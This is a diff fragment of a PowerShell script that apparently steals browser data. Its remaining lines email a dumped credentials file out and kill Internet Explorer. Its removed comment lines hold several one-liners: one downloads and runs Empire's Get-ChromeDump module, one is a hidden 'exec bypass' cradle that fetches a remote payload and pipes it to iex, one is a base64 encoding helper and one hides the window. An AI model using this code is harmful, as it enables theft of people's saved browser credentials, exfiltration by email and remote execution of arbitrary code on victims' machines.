@@ -31,15 +31,3 @@ function Send-ToEmail([string]$email, [string]$attachmentpath){
 Send-ToEmail  -email "to-address-email" -attachmentpath $env:temp\dumped.txt 2>$null;
 Start-Sleep -Seconds 10
 Get-Process -Name iexplore | Stop-Process
-
-
-
-#---------One Liner-------#
-#(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1","$env:temp\file.ps1");Import-Module $env:temp\file.ps1;Get-ChromeDump -OutFile $env:temp\dumped.txt 3>$null
-
-#powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
-
-
-#[convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
-
-#Powershell .\download.ps1 -windowstyle hidden  - use this to hide the window
